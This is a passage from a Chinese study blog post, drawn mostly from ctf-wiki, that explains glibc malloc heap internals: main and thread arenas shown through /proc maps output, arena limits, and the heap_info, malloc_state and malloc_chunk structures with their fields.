class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000=0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;lsploits&#x2F;hof&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;lsploits&#x2F;hof&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><p><strong>第一个线程 malloc 后</strong>， 我们可以从下面输出看出线程 1 的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是 132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为 mmap 函数。同时，我们可以看出实际真的分配给程序的内存为 1M(b7500000-b7600000)。而且，只有 132KB 的部分具有可读可写权限，这一块连续的区域成为 thread arena。</p><p>注意：</p><blockquote><p>当用户请求的内存大于 128KB 时，并且没有任何 arena 有足够的空间时，那么系统就会执行 mmap 函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ .&#x2F;mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$ cat &#x2F;proc&#x2F;6501&#x2F;maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     &#x2F;home&#x2F;sploitfun&#x2F;ptmalloc.ppt&#x2F;mthread&#x2F;mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0</span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~&#x2F;ptmalloc.ppt&#x2F;mthread$</span><br></pre></td></tr></table></figure><h1 id="堆相关数据结构"><a href="#堆相关数据结构" class="headerlink" title="堆相关数据结构"></a>堆相关数据结构</h1><blockquote><p>内容绝大部分来自ctf-wiki，文章用于自己学习记录</p></blockquote><p>堆的操作就这么复杂，那么在 glibc 内部必然也有精心设计的数据结构来管理它。与堆相应的数据结构主要分为</p><ul><li>宏观结构，包含堆的宏观信息，可以通过这些数据结构索引堆的基本信息。</li><li>微观结构，用于具体处理堆的分配与回收中的内存块。</li></ul><h2 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h2><h3 id="32位内存布局"><a href="#32位内存布局" class="headerlink" title="32位内存布局"></a>32位内存布局</h3><p><img src="img%5C32mem.png" alt="32位内存布局"></p><p>从高地址到低地址为：不可访问的内核空间，栈空间（由高地址向低地址生长），内存布局区，堆空间（由低地址向高地址生长），BSS，数据段，文本段。本报告讨论进程的栈空间和堆空间的具体结构。</p><h3 id="64位内存布局"><a href="#64位内存布局" class="headerlink" title="64位内存布局"></a>64位内存布局</h3><p>用户空间的布局和32位差别很小。</p><p><img src="img%5C64mem.png" alt="64位内存布局"></p><h3 id="堆管理介绍"><a href="#堆管理介绍" class="headerlink" title="堆管理介绍"></a>堆管理介绍</h3><h4 id="3-种数据结构"><a href="#3-种数据结构" class="headerlink" title="3 种数据结构"></a>3 种数据结构</h4><p>在 <code>glibc</code> 的 <code>malloc</code> 中针对堆管理，主要涉及到以下 3 种数据结构：</p><ul><li>heap_info（即Heap Header）对应管理 heap</li><li>malloc_state（即Arena Header） 对应管理 area</li><li>malloc_chunk（即Chunk Header） 对应管理 chunk</li></ul><blockquote><p>这里堆管理会出现在多线程，一般pwn题不会涉及多线程操作，也就是都是在 main_area 上操作，因此可选择性阅读 heap_info、malloc_state。</p></blockquote><h5 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h5><p>heap_info: 即Heap Header，因为一个<strong>thread arena</strong>（注意：不包含<strong>main thread</strong>）可以包含多个heaps，所以为了便于管理，就给每个 heap 分配一个 heap  header。那么在什么情况下一个thread arena会包含多个 heaps 呢?在当前 heap 不够用的时候，malloc 会通过系统调用 mmap 申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><h6 id="Arena-数量限制"><a href="#Arena-数量限制" class="headerlink" title="Arena 数量限制"></a>Arena 数量限制</h6><p>主线程和子线程有自己独立的 <em>arena</em>，那么是不是无论有多少个线程，每个线程都有自己独立的 <em>arena</em> 呢？答案是否定的。事实上，<em>arena</em>的个数是跟系统中处理器核心个数相关的，如下表所示：</p><table><thead><tr><th align="center">systems</th><th align="center">number of arena</th></tr></thead><tbody><tr><td align="center">32bits</td><td align="center">2 x number of cpu cores + 1</td></tr><tr><td align="center">64bits</td><td align="center">8 x number of cpu cores + 1</td></tr></tbody></table><h6 id="Arena-管理"><a href="#Arena-管理" class="headerlink" title="Arena 管理"></a>Arena 管理</h6><p>假设有如下情景：一台只含有一个处理器核心的机器安装有 32 位操作系统，其上运行了一个多线程应用程序，共含有 4 个线程——主线程和三个子线程。显然线程个数大于系统能维护的最大 <em>arena</em> 个数（2 x 核心数 + 1= 3），那么此时 <code>glibc</code> 的 <code>malloc</code> 就需要确保这 4 个线程能够正确地共享这 3 个 <em>arena</em>，那么它是如何实现的呢？</p><p>当主线程首次调用 <code>malloc</code> 的时候会直接为它分配一个 <em>main arena</em>，而不需要任何附加条件。</p><p>当子线程 1 和子线程 2 首次调用 <code>malloc</code> 的时候，<code>glibc</code> 实现的 <code>malloc</code> 会分别为每个子线程创建一个新的 <em>thread arena</em>。此时，各个线程与 <em>arena</em> 是一一对应的。但是，当用户线程 3 调用 <code>malloc</code> 的时候就出现问题了。因为此时 <code>glibc</code> 的 <code>malloc</code> 能维护的 <em>arena</em> 个数已经达到上限，无法再为子线程 3 分配新的 <em>arena</em> 了，那么就需要重复使用已经分配好的 3 个 <em>arena</em> 中的一个（<em>main arena</em>, <em>arena1</em> 或者 <em>arena2</em>）。那么该选择哪个 <em>arena</em> 进行重复利用呢？<code>glibc</code> 的 <code>malloc</code> 遵循以下规则：</p><ol><li>首先循环遍历所有可用的 <em>arena</em>，在遍历的过程中，它会尝试加锁该 <em>arena</em>。如果成功加锁（该 <em>arena</em> 当前对应的线程并未使用堆内存则表示可加锁），比如将 <em>main arena</em> 成功锁住，那么就将 <em>main arena</em> 返回给用户，即表示该 <em>arena</em> 被子线程 3 共享使用。</li><li>如果没能找到可用的 <em>arena</em>，那么就将子线程 3 的 <code>malloc</code> 操作阻塞，直到有可用的 <em>arena</em> 为止。</li><li>现在，如果子线程 3 再次调用 <code>malloc</code> 的话，<code>glibc</code> 的 <code>malloc</code> 就会先尝试使用最近访问的 <em>arena</em>（此时为 <em>main arena</em>）。如果此时 <em>main arena</em> 可用的话，就直接使用，否则就将子线程 3 阻塞，直到 <em>main arena</em> 再次可用为止。</li></ol><p>这样子线程 3 与主线程就共享 <em>main arena</em> 了。至于其他更复杂的情况，以此类推。</p><h5 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h5><p>malloc_state: 即Arena Header，用于表示 area 的信息，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等(这些概念会在后文详细介绍):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h5 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h5><p>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size_t size)传递的size参数“就是”chunk的大小(这里给“就是”加上引号，说明这种表示并不准确，但是为了方便理解就暂时这么描述了，详细说明见后文)。每个chunk都由一个结构体malloc_chunk表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  <span class="comment">/* #define INTERNAL_SIZE_T size_t */</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. 这两个指针只在free chunk中存在*/</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>关于上述的结构（malloc_chunk主线程也用到），针对子线程的，主线程和子线程有一些不同：</p><ol><li>主线程的堆不是分配在内存映射区，而是进程的虚拟内存堆区，因此不含有多个 <em>heap</em> 所以也就不含有 <code>heap_info</code> 结构体。当需要更多堆空间的时候，直接通过增长 <code>brk</code> 指针来获取更多的空间，直到它碰到内存映射区域（mapping）为止。</li><li>不同于 <em>thread arena</em>，主线程的 <em>main arena</em> 的 <em>arena header</em> 并不在堆区中，而是一个全局变量，因此它属于 <code>libc.so</code> 的 data segment 区域。</li></ol><h4 id="heap-segment与arena关系"><a href="#heap-segment与arena关系" class="headerlink" title="heap segment与arena关系"></a>heap segment与arena关系</h4><p>首先，通过内存分布图理清malloc_state与heap_info之间的组织关系。</p><p>下图是只有一个heap segment的main arena和thread arena的内存分布图：</p><p>![heap segment](img\heap segment.png)</p><p>下图是一个thread arena中含有多个heap segments的情况：</p><p>![heap segments](img\heap segments.png)</p><p>从上图可以看出，thread arena只含有一个malloc_state(即arena header)，却有两个heap_info(即heap header)。由于两个heap segments是通过mmap分配的内存，两者在内存布局上并不相邻而是分属于不同的内存区间，所以为了便于管理，libc malloc将第二个heap_info结构体的prev成员指向了第一个heap_info结构体的起始位置（即ar_ptr成员），而第一个heap_info结构体的ar_ptr成员指向了malloc_state，这样就构成了一个单链表，方便后续管理。</p><h2 id="微观结构"><a href="#微观结构" class="headerlink" title="微观结构"></a>微观结构</h2><h3 id="chunk-介绍"><a href="#chunk-介绍" class="headerlink" title="chunk 介绍"></a>chunk 介绍</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>在 glibc malloc 中将整个堆内存空间分成了连续的、大小不一的 chunk ，即对于堆内存管理而言 chunk 就是最小操作单位。<em>chunk</em> 总共分为 4 大类：</p><ul><li><em>allocated chunk</em></li><li><em>free chunk</em></li><li><em>top chunk</em></li><li><em>last remainder chunk</em></li></ul><p>从本质上来说，所有类型的 <em>chunk</em> 都是内存中一块连续的区域，只是通过该区域中特定位置的某些标识符加以区分。为了简便，也可以将这 4 大类 <em>chunk</em> 简化为 2 类：<em>allocated chunk</em> 以及 <em>free chunk</em>，前者表示已经分配给用户使用的 <em>chunk</em>，后者表示未使用的 <em>chunk</em>。</p><p>任何堆内存管理器都是以 <em>chunk</em> 为单位进行堆内存管理的，而这就需要一些数据结构来标志各个块的边界，以及区分已分配块和空闲块。大多数堆内存管理器都将这些边界信息作为 <em>chunk</em> 的一部分嵌入到 <em>chunk</em> 内部。</p><p><strong>无论一个 chunk 的大小如何，处于分配状态还是释放状态，它们都使用一个统一的结构（malloc_chunk）。虽然它们使用了同一个数据结构，但是根据是否被释放，它们的表现形式会有所不同。</strong></p><h4 id="malloc-chunk-allocated-chunk"><a href="#malloc-chunk-allocated-chunk" class="headerlink" title="malloc_chunk (allocated chunk)"></a>malloc_chunk (allocated chunk)</h4><p>malloc_chunk 的结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>一般来说，size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。</p><p>每个字段的具体的解释如下</p><ul><li><p><strong>prev_size</strong></p><p>如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。</p></li><li><p><strong>size</strong></p><p>该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示</p><ul><li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li><li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li><li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li></ul></li><li><p><strong>fd，bk</strong></p><p>chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p><ul><li>fd 指向下一个（非物理相邻）空闲的 chunk</li><li>bk 指向上一个（非物理相邻）空闲的 chunk</li><li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li></ul></li><li><p><strong>fd_nextsize， bk_nextsize</strong></p><p>也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。</p><ul><li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li><li>一般空闲的 large chunk 在 fd 